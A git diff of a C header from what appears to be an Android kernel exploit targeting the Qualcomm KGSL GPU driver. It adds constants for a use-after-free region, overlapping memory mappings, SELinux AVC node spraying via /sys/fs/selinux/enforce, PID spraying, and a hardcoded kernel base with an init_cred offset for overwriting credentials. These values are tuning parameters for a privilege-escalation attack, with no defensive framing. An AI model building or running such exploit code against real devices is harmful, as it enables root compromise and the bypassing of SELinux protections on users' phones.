@@ -51,13 +51,25 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
-#define OVERLAP_COUNT 100
-#define UAF_SIZE  0x10004000ULL
-#define OVERLAP_SIZE 0x1000
-#define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
-#define SPRAY_PIDS 2000
 
-#define VMLINUX_TEXT 0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED_OFFSET 0x26fa738
+#define UAF_ADDR         0x7001ff000ULL
+#define UAF_SIZE         0x10004000ULL
+#define OVERLAP_ADDR     0x7001fe000ULL
+#define OVERLAP_SIZE     0x1000
+#define BOGUS_ADDR       0x700204000ULL
+#define BOGUS_SIZE       0x1000
+#define PLACEHOLDER_ADDR 0x710204000ULL
+#define PLACEHOLDER_SIZE 0x10400000ULL
+
+#define AVC_ENFORCE_PATH   "/sys/fs/selinux/enforce"
+#define AVC_NODE_STRIDE    72
+#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
+#define AVC_PAGES_PER_IB   12
+#define AVC_LOOP_SECONDS   150
+#define SPRAY_PIDS         2000
+#define CHURN_MAX_PATHS    20000
+
+#define VMLINUX_TEXT              0xffffffc010080000ULL
+#define VMLINUX_INIT_CRED_OFFSET  0x26fa738
 
 #endif
